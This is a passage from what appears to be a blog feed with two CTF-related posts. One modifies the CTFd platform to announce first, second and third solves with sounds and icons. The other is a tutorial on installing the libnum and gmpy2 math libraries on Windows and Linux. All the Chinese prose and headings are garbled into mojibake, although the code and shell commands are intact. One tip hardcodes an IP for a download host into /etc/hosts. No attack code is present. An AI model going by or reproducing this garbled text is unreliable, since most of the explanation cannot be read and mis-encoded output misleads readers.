class="hljs-number">2</span>:<br>  blood_number = <span class="hljs-string">&quot;second&quot;</span><br> <span class="hljs-keyword">elif</span> solve_count == <span class="hljs-number">3</span>:<br> blood_number = <span class="hljs-string">&quot;third&quot;</span><br> <span class="hljs-keyword">else</span>:<br> <span class="hljs-keyword">pass</span><br> <span class="hljs-keyword">if</span> blood_number:<br> broad = &#123;<br> <span class="hljs-string">&#x27;title&#x27;</span>:<span class="hljs-string">&quot;Congratulations!&quot;</span>,<br> <span class="hljs-string">&#x27;content&#x27;</span>:<span class="hljs-string">&quot;User [&#123;0&#125;] got the &#123;1&#125; blood of [&#123;2&#125;]&quot;</span>.<span class="hljs-built_in">format</span>(user_name, blood_number, challenge_name)<br> &#125;<br>        schema = NotificationSchema()<br> broad_result = schema.load(broad)<br><br> db.session.add(broad_result.data)<br> db.session.commit()<br><br> <span class="hljs-comment"># Grab additional settings</span><br> broad[<span class="hljs-string">&quot;type&quot;</span>] = <span class="hljs-string">&quot;toast&quot;</span><br> broad[<span class="hljs-string">&quot;sound&quot;</span>] = <span class="hljs-literal">False</span><br> broad[<span class="hljs-string">&quot;blood&quot;</span>] = blood_number<br><br> app.events_manager.publish(data=broad, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;notification&quot;</span>)<br>                <br> <span class="hljs-keyword">return</span> &#123;<br> <span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">True</span>,<br> <span class="hljs-string">&quot;data&quot;</span>: &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;correct&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: message&#125;,<br> &#125;<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ <code>/CTFd/config.py</code> é‡Œå¢åŠ  <code>AUTO_BROADCAST = True</code></p><h3 id="æç¤ºéŸ³ä¿®æ”¹"><a href="#æç¤ºéŸ³ä¿®æ”¹" class="headerlink" title="æç¤ºéŸ³ä¿®æ”¹"></a>æç¤ºéŸ³ä¿®æ”¹</h3><p>å°†å‡†å¤‡çš„ä¸‰æ€çš„éŸ³æ•ˆæ”¾è¿› <code>/CTFd/CTFd/themes/core/static/sounds</code>ï¼Œç„¶ååœ¨ <code>/CTFd/CTFd/themes/core/static/js/events.js</code> ä¿®æ”¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> howl = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Howl</span>(&#123;<br>    <span class="hljs-attr">src</span>: [<br>      root + <span class="hljs-string">&quot;/themes/core/static/sounds/notification.webm&quot;</span>,<br>      root + <span class="hljs-string">&quot;/themes/core/static/sounds/notification.mp3&quot;</span><br>    ]<br>  &#125;);<br><span class="hljs-keyword">const</span> howl_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Howl</span>(&#123;<br> <span class="hljs-attr">src</span>: [<br>            root + <span class="hljs-string">&quot;/themes/core/static/sounds/first.webm&quot;</span>,<br>            root + <span class="hljs-string">&quot;/themes/core/static/sounds/first.mp3&quot;</span><br> ]<br> &#125;);<br> <span class="hljs-keyword">const</span> howl_s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Howl</span>(&#123;<br> <span class="hljs-attr">src</span>: [<br> root + <span class="hljs-string">&quot;/themes/core/static/sounds/second.webm&quot;</span>,<br> root + <span class="hljs-string">&quot;/themes/core/static/sounds/second.mp3&quot;</span><br> ]<br> &#125;);<br><span class="hljs-keyword">const</span> howl_t = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Howl</span>(&#123;<br> <span class="hljs-attr">src</span>: [<br> root + <span class="hljs-string">&quot;/themes/core/static/sounds/third.webm&quot;</span>,<br> root + <span class="hljs-string">&quot;/themes/core/static/sounds/third.mp3&quot;</span><br> ]<br> &#125;);<br></code></pre></td></tr></table></figure><p>ç„¶åæ·»åŠ :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">switch</span> (data.<span class="hljs-property">blood</span>) &#123;<br> <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;first&quot;</span>:<br> howl_f.<span class="hljs-title function_">play</span>(); <span class="hljs-keyword">break</span>;<br> <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;second&quot;</span>:<br> howl_s.<span class="hljs-title function_">play</span>(); <span class="hljs-keyword">break</span>;<br> <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;third&quot;</span>:<br> howl_t.<span class="hljs-title function_">play</span>(); <span class="hljs-keyword">break</span>;<br> <span class="hljs-attr">default</span>: <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/17/8tnt8x.png" alt="8tnt8x.png"></p><p>ç„¶åå…¨å±€æœç´¢ï¼Œå°†å¸¦æœ‰ <code>notification.webm</code> çš„æ‰€æœ‰ <code>min.js</code> å…¨éƒ¨æŒ‰ç…§è¿™ä¸ªæ ¼å¼ä¿®æ”¹ï¼ˆå¤§æ¦‚20+ä¸ªæ–‡ä»¶ï¼‰ï¼Œè¿˜è¦æ³¨æ„æ··æ·†ï¼š<code>root -&gt; e</code> ï¼Œ<code>data.blood -&gt; e.blood </code>ã€‚</p><h1 id="é¢˜ç›®solvesæ˜¾ç¤º"><a href="#é¢˜ç›®solvesæ˜¾ç¤º" class="headerlink" title="é¢˜ç›®solvesæ˜¾ç¤º"></a>é¢˜ç›®solvesæ˜¾ç¤º</h1><p>å°†solvesçš„ç”¨æˆ·ç­›é€‰åªæ˜¾ç¤ºå‰ä¸‰ï¼Œå¹¶ä¸”å¢åŠ å°å›¾æ ‡ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/17/8tnN26.png" alt="8tnN26.png"></p><p>å¢åŠ ä¸€ä¸ªåˆ—ï¼Œåœ¨ <code>/themes/core/static/js/pages/challenges.min.js</code></p><p><img src="https://s1.ax1x.com/2020/03/17/8tndKO.png" alt="8tndKO.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>; n &lt; <span class="hljs-number">3</span>; n++) &#123;<br> <span class="hljs-keyword">var</span> s = t[n].<span class="hljs-property">account_id</span>,<br> a = t[n].<span class="hljs-property">name</span>,<br> i = (<span class="hljs-number">0</span>, d.<span class="hljs-property">default</span>)(t[n].<span class="hljs-property">date</span>).<span class="hljs-title function_">local</span>().<span class="hljs-title function_">fromNow</span>(),<br> l = t[n].<span class="hljs-property">account_url</span>;<br> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>)&#123;<br> rk = <span class="hljs-string">&#x27;&lt;img src=&quot;themes/core/static/img/1.png&quot; width=&quot;33&quot; height=&quot;33&quot;&gt;&#x27;</span>;<br> &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>)&#123;<br> rk = <span class="hljs-string">&#x27;&lt;img src=&quot;themes/core/static/img/2.png&quot; width=&quot;27&quot; height=&quot;27&quot;&gt;&#x27;</span>;<br> &#125;<span class="hljs-keyword">else</span>&#123;<br> rk = <span class="hljs-string">&#x27;&lt;img src=&quot;themes/core/static/img/3.png&quot; width=&quot;15&quot; height=&quot;15&quot;&gt;&#x27;</span>;<br> &#125;<br> o.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td&gt;&#123;4&#125;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;&#123;0&#125;&quot;&gt;&#123;2&#125;&lt;/td&gt;&lt;td&gt;&#123;3&#125;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>.<span class="hljs-title function_">format</span>(l, s, (<span class="hljs-number">0</span>, r.<span class="hljs-property">htmlEntities</span>)(a), i, rk))<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯†ç å­¦libnumå’Œgmpy2æ¨¡å—çš„å®‰è£…</title>
    <link href="/2020/02/28/libnum_gmpy2/"/>
    <url>/2020/02/28/libnum_gmpy2/</url>
    
    <content type="html"><![CDATA[<p>ç»ˆäºæœ‰ç©ºæ¥æ•´ç†ä¸€ä¸‹å®‰è£…æ•™ç¨‹ï¼Œé¡ºä¾¿ç»™æ–°äººç•™ç‚¹å‚è€ƒèµ„æ–™ï¼Œé¿å…è¸©å‘ã€‚</p><h1 id="libnum"><a href="#libnum" class="headerlink" title="libnum"></a>libnum</h1><p>libnumåº“æ˜¯ä¸€ä¸ªå…³äºå„ç§æ•°å­¦è¿ç®—çš„å‡½æ•°åº“ï¼Œå®ƒåŒ…å«common mathsã€modularã€modular squre rootsã€primesã€factorizationã€ECCã€convertingã€stuffç­‰æ–¹é¢çš„å‡½æ•°ï¼Œç»“åˆ<a href="#gmpy2">gmpy2åº“</a>ã€<a href="#">PyCryptoåº“</a>ä¸€èµ·æ¥ä½¿ç”¨ä¼šä½¿è®¡ç®—å˜å¾—éå¸¸ç®€ä¾¿ã€‚</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/hellman/libnum<br><span class="hljs-built_in">cd</span> libnum<br>python setup.py install<br></code></pre></td></tr></table></figure><h2 id="å¸¸ç”¨çš„Converting"><a href="#å¸¸ç”¨çš„Converting" class="headerlink" title="å¸¸ç”¨çš„Converting"></a>å¸¸ç”¨çš„Converting</h2><p>æ•°å­—å‹ï¼ˆä¸è®ºæ˜¯åå…­è¿›åˆ¶è¿˜æ˜¯åè¿›åˆ¶ï¼‰ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>s=<span class="hljs-string">&quot;flag&#123;52Hertz_is_caiji&#125;&quot;</span><br><span class="hljs-built_in">print</span>(libnum.s2n(s))<br><span class="hljs-comment"># 38321129010630712848744725072051706353616984535099773</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>n=<span class="hljs-number">0x666c61677b3532486572747a5f69735f6361696a697d</span><br><span class="hljs-built_in">print</span> libnum.n2s(n)<br><span class="hljs-comment">#è¿™ä¸ªè½¬æ¢ä¸ç”¨åœ¨æ„åå…­è¿›åˆ¶çš„ä½æ•°æ˜¯å¦ä¸ºå¶æ•°</span><br></code></pre></td></tr></table></figure><p>äºŒè¿›åˆ¶ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>s=<span class="hljs-string">&#x27;52Hertz&#x27;</span><br><span class="hljs-built_in">print</span>(libnum.s2b(s))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>b=<span class="hljs-string">&#x27;00110101001100100100100001100101011100100111010001111010&#x27;</span><br><span class="hljs-built_in">print</span> libnum.b2s(b)<br><span class="hljs-comment">#äºŒè¿›åˆ¶çš„ä½æ•°æœ€å¥½æ˜¯8çš„å€æ•°</span><br></code></pre></td></tr></table></figure><h2 id="è´¨æ•°-amp-å› æ•°åˆ†è§£"><a href="#è´¨æ•°-amp-å› æ•°åˆ†è§£" class="headerlink" title="è´¨æ•°&amp;å› æ•°åˆ†è§£"></a>è´¨æ•°&amp;å› æ•°åˆ†è§£</h2><p>ç”Ÿæˆè´¨æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(libnum.generate_prime(<span class="hljs-number">1024</span>))<br></code></pre></td></tr></table></figure><p>å› æ•°åˆ†è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(libnum.factorize(<span class="hljs-number">1024</span>))<br></code></pre></td></tr></table></figure><h1 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h1><p>GMPï¼ˆGNU Multiple Precision Arithmetic Libraryï¼Œå³GNUé«˜ç²¾åº¦ç®—æœ¯è¿ç®—åº“ï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æºçš„é«˜ç²¾åº¦è¿ç®—åº“ï¼Œå…¶ä¸­ä¸ä½†æœ‰æ™®é€šçš„æ•´æ•°ã€å®æ•°ã€æµ®ç‚¹æ•°çš„é«˜ç²¾åº¦è¿ç®—ï¼Œè¿˜æœ‰éšæœºæ•°ç”Ÿæˆï¼Œå°¤å…¶æ˜¯æä¾›äº†éå¸¸å®Œå¤‡çš„æ•°è®ºä¸­çš„è¿ç®—æ¥å£ï¼Œæ¯”å¦‚Miller-Rabinç´ æ•°æµ‹è¯•ç®—æ³•ã€å¤§ç´ æ•°ç”Ÿæˆã€æ¬§å‡ é‡Œå¾·ç®—æ³•ã€æ±‚åŸŸä¸­å…ƒç´ çš„é€†ã€Jacobiç¬¦å·ã€legendreç¬¦å·ç­‰ã€‚<br>gmpy2æ˜¯Pythonçš„ä¸€ä¸ªæ‰©å±•åº“ï¼Œæ˜¯å¯¹GMPçš„å°è£…ï¼Œå®ƒçš„å‰èº«æ˜¯gmpyï¼Œç»è¿‡å…¶ä½œè€…çš„è°ƒæ•´å’Œå°è£…ï¼Œä½¿å¾—gmpy2çš„ä½¿ç”¨å¤§å¤§ç®€åŒ–ã€‚</p><h2 id="Windowsä¸Šå®‰è£…"><a href="#Windowsä¸Šå®‰è£…" class="headerlink" title="Windowsä¸Šå®‰è£…"></a>Windowsä¸Šå®‰è£…</h2><p>åœ¨windowsä¸Šç›´æ¥å®‰è£…wheelæ–‡ä»¶å°±æ–¹ä¾¿å¤šäº†ã€‚</p><p><a href="https://pypi.org/project/gmpy2/#files">https://pypi.org/project/gmpy2/#files</a></p><p>è¿™é‡Œé¢æœ‰python2.6ã€2.7ã€3.2ã€3.3ã€3.4ç‰ˆæœ¬çš„wheelæ–‡ä»¶ï¼Œä¸‹è½½åç”¨pipå®‰è£…å³å¯ã€‚</p><p>å¦‚æœæœ‰é«˜ç‰ˆæœ¬çš„å¯ä»¥å‚è€ƒ <a href="https://github.com/aleaxit/gmpy/releases/tag/gmpy2-2.1.0a1">Githubé¡¹ç›®</a>ï¼Œæˆ–è€… <a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#gmpy">Here</a></p><h3 id="wheel"><a href="#wheel" class="headerlink" title="wheel"></a>wheel</h3><p>å…ˆæ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å®‰è£…äº†wheelæ–‡ä»¶åŒ…ï¼Œåœ¨cmdä¸­è¾“å…¥wheelï¼ŒæŸ¥çœ‹ä¸€ä¸‹ï¼Œå¦‚æœæ²¡æœ‰å®‰è£…ï¼Œåˆ™è¾“å…¥å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install wheel<br></code></pre></td></tr></table></figure><h3 id="ä¸‹è½½å¯¹åº”whlæ–‡ä»¶"><a href="#ä¸‹è½½å¯¹åº”whlæ–‡ä»¶" class="headerlink" title="ä¸‹è½½å¯¹åº”whlæ–‡ä»¶"></a>ä¸‹è½½å¯¹åº”whlæ–‡ä»¶</h3><p>ä»¥æˆ‘è‡ªå·±çš„ç¯å¢ƒä¸ºä¾‹ï¼Œæˆ‘ä¸‹è½½çš„æ˜¯ <a href="javascript:;">gmpy2â€‘2.0.8â€‘cp37â€‘cp37mâ€‘win32.whl</a></p><p>whlæ–‡ä»¶åŒ…éœ€è¦å’Œä½ æ‰€å®‰è£…çš„python3ç‰ˆæœ¬ä¸€è‡´ï¼Œå»ºè®®è¿™ä¸ªæ–‡ä»¶ä¸‹è½½åæ”¾åˆ°pythonæ–‡ä»¶ç›®å½•ä¸‹ã€‚</p><h3 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>æ‰“å¼€cmdï¼Œè¾“å…¥ <code>pip install [whlæ–‡ä»¶çš„ç»å¯¹è·¯å¾„]</code> å®‰è£…whlæ–‡ä»¶åŒ…</p><p>ä»¥æˆ‘ä¸ºä¾‹:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install C:\Users\mcwin\AppData\Local\Programs\Python\Python37-32\gmpy2-2.0.8-cp37-cp37m -win32.whl<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p>ç„¶åè¾“å…¥ <code>import gmpy2</code> å³å¯è¿›è¡Œä½¿ç”¨</p><h2 id="Linuxä¸Šå®‰è£…"><a href="#Linuxä¸Šå®‰è£…" class="headerlink" title="Linuxä¸Šå®‰è£…"></a>Linuxä¸Šå®‰è£…</h2><p>gmpy2æ˜¯ä¾èµ–GMPã€MPFRã€MPCä¸‰ä¸ªåº“ï¼Œæ•…æ­¤åœ¨linuxä¸Šå®‰è£…å‰å¾—å…ˆå®‰è£…è¿™3ä¸ªåº“ã€‚</p><p>ä¸ºäº†åç»­å®‰è£…çš„æ–¹ä¾¿ï¼Œå…ˆå»ºç«‹2ä¸ªæ–‡ä»¶å¤¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/src<br><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/static<br></code></pre></td></tr></table></figure><p>æµ‹è¯•æœ‰æ²¡æœ‰å®‰è£…m4æ¨¡å—ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">man m4<br></code></pre></td></tr></table></figure><p>å¦‚æœå‡ºç°No manual entry for m4ï¼Œå°±è¯´æ˜æ²¡æœ‰å®‰è£…m4æ¨¡å—ã€‚</p><p>å¦‚æœæ²¡å®‰è£…m4æ¨¡å—ï¼Œåœ¨ç¼–è¯‘GMPæ—¶å€™ä¼šæŠ¥é”™<code>checking for suitable m4... configure: error: No usable m4 in $PATH or /usr/5bin (see config.log for reasons)</code>.</p><h3 id="å®‰è£…m4"><a href="#å®‰è£…m4" class="headerlink" title="å®‰è£…m4"></a>å®‰è£…m4</h3><p>GNU M4 is an implementation of the traditional Unix macro processor. It is mostly SVR4 compatible although it has some extensions (for example, handling more than 9 positional parameters to macros). GNU M4 also has built-in functions for including files, running shell commands, doing arithmetic, etc.</p><p>1.4.18 ç‰ˆæœ¬ä¸ºä¾‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">v=1.4.18<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/src<br>wget http://ftp.gnu.org/gnu/m4/m4-<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz<br>tar xf m4-<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz &amp;&amp; <span class="hljs-built_in">cd</span> m4-<span class="hljs-variable">$&#123;v&#125;</span><br>./configure -prefix=/usr/local<br>make &amp;&amp; make check &amp;&amp; make install<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…GMP"><a href="#å®‰è£…GMP" class="headerlink" title="å®‰è£…GMP"></a>å®‰è£…GMP</h3><p>GMP(The GNU Multiple Precision Arithmetic Library) is a free library for arbitrary precision arithmetic, operating on signed integers, rational numbers, and floating-point numbers.<br><a href="https://gmplib.org/">https://gmplib.org/</a></p><p>6.1.2 ç‰ˆæœ¬ä¸ºä¾‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">v=6.1.2<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/src<br>wget https://gmplib.org/download/gmp/gmp-<span class="hljs-variable">$&#123;v&#125;</span>.tar.bz2<br>tar -jxvf gmp-<span class="hljs-variable">$&#123;v&#125;</span>.tar.bz2 &amp;&amp; <span class="hljs-built_in">cd</span> gmp-<span class="hljs-variable">$&#123;v&#125;</span><br>./configure --prefix=<span class="hljs-variable">$HOME</span>/static --enable-static --disable-shared --with-pic<br>make &amp;&amp; make check &amp;&amp; make install<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…MPFR"><a href="#å®‰è£…MPFR" class="headerlink" title="å®‰è£…MPFR"></a>å®‰è£…MPFR</h3><p>The MPFR library is a C library for multiple-precision floating-point computations with correct rounding.<br><a href="http://www.mpfr.org/mpfr-current/#download">http://www.mpfr.org/mpfr-current/#download</a><br>4.0.1 ä¸ºä¾‹ ï¼ˆè¯·è‡ªå·±è®¿é—®å®˜ç½‘ï¼Œæ›¿æ¢æˆæœ€æ–°çš„ç‰ˆæœ¬å·ï¼‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">v=4.0.1<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/src<br>wget http://www.mpfr.org/mpfr-current/mpfr-<span class="hljs-variable">$&#123;v&#125;</span>.tar.bz2<br>tar -jxvf mpfr-<span class="hljs-variable">$&#123;v&#125;</span>.tar.bz2 &amp;&amp; <span class="hljs-built_in">cd</span> mpfr-<span class="hljs-variable">$&#123;v&#125;</span><br>./configure --prefix=<span class="hljs-variable">$HOME</span>/static --enable-static --disable-shared --with-pic --with-gmp=<span class="hljs-variable">$HOME</span>/static<br>make &amp;&amp; make check &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>å¦‚æœmpfr.orgä¸‹è½½å¤ªæ…¢ï¼Œå¯ä»¥æ¢ä¸º</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">wget http://ftp.gnu.org/gnu/mpfr/mpfr-<span class="hljs-variable">$&#123;v&#125;</span>.tar.bz2<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…MPC"><a href="#å®‰è£…MPC" class="headerlink" title="å®‰è£…MPC"></a>å®‰è£…MPC</h3><p>GNU MPC is a C library for the arithmetic of complex numbers with arbitrarily high precision and correct rounding of the result.<br><a href="http://www.multiprecision.org/mpc/download.html">http://www.multiprecision.org/mpc/download.html</a> ï¼ˆè¿™é‡Œæœ€æ–°æ˜¯1.0.3ï¼‰<br>ä½†å½“mpfrç‰ˆæœ¬ä¸º4.xä»¥ä¸Šä¼šæŠ¥é”™Makefile:532: recipe for target â€˜mul.loâ€™ failed</p><p>åœ¨<a href="ftp://ftp.gnu.org/gnu/mpc/">ftp://ftp.gnu.org/gnu/mpc/ </a>å¯ä»¥æ‰¾åˆ°æ›´æ–°çš„1.1.0ç‰ˆæœ¬</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">v=1.1.0<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/src<br>wget ftp://ftp.gnu.org/gnu/mpc/mpc-<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz<br>tar -zxvf mpc-<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz &amp;&amp; <span class="hljs-built_in">cd</span> mpc-<span class="hljs-variable">$&#123;v&#125;</span><br>./configure --prefix=<span class="hljs-variable">$HOME</span>/static --enable-static --disable-shared --with-pic --with-gmp=<span class="hljs-variable">$HOME</span>/static --with-mpfr=<span class="hljs-variable">$HOME</span>/static<br>make &amp;&amp; make check &amp;&amp; make install<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…gmpy2"><a href="#å®‰è£…gmpy2" class="headerlink" title="å®‰è£…gmpy2"></a>å®‰è£…gmpy2</h3><p>githubé¡¹ç›®ï¼š<a href="https://github.com/aleaxit/gmpy">https://github.com/aleaxit/gmpy</a></p><p>ç°åœ¨æ–°çš„ç‰ˆæœ¬ï¼ˆ2-2.1.0b1ä»¥ä¸Šç‰ˆæœ¬ï¼‰åœ¨æ‰§è¡Œpython setup.py build_ext â€“static&#x3D;$HOME&#x2F;static install</p><p>ä¼šæŠ¥é”™error: option â€“static must not have an argument</p><p>è§£å†³æ³•å­1ï¼š</p><p>æ‰¾<a href="https://github.com/aleaxit/gmpy/releases/">releasesç‰ˆæœ¬</a>ï¼ˆ2-2.1.0a1ä»¥ä¸‹ç‰ˆæœ¬ï¼‰æ¥å®‰è£…</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">v=2-2.1.0a1<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/src<br>wget https://github.com/aleaxit/gmpy/releases/download/gmpy<span class="hljs-variable">$&#123;v&#125;</span>/gmpy<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz<br>tar xf gmpy<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz &amp;&amp; <span class="hljs-built_in">cd</span> gmpy<span class="hljs-variable">$&#123;v&#125;</span><br>python setup.py build_ext --static=<span class="hljs-variable">$HOME</span>/static install<br></code></pre></td></tr></table></figure><p>è§£å†³æ³•å­2ï¼š</p><p>å› ä¸ºæ–°ç‰ˆæœ¬çš„setup.pyä¿®æ”¹äº†ä¸å°‘ï¼Œæ•…å¾—é‡‡ç”¨ä»¥ä¸‹æ³•å­ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python setup.py build_ext --static-dir=<span class="hljs-variable">$HOME</span>/static install<br></code></pre></td></tr></table></figure><p>å®‰è£…åï¼Œå‘½ä»¤è¡Œè¿›å…¥pythonæ¨¡å¼åï¼Œè¾“å…¥import gmpy2æ²¡æŠ¥é”™å°±æˆåŠŸäº†ã€‚</p><p>å¦‚æœä½¿ç”¨wgetä¸‹è½½æ—¶å€™ä¸€ç›´å¡åœ¨ï¼š</p><p><code>Connecting to github-production-release-asset-2e65be.s3.amazonaws.com (github-production-release-asset-2e65be.s3.amazonaws.com)|52.216.227.24|:443...</code></p><p>å¯ä»¥å°è¯•ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> 52.216.16.16 github-production-release-asset-2e65be.s3.amazonaws.com &gt;&gt;/etc/hosts<br>/etc/init.d/networking restart<br></code></pre></td></tr></table></figure><p>å¦‚æœæŠ¥é”™fatal error: Python.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">apt-<span class="hljs-built_in">get</span> install python-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><h3 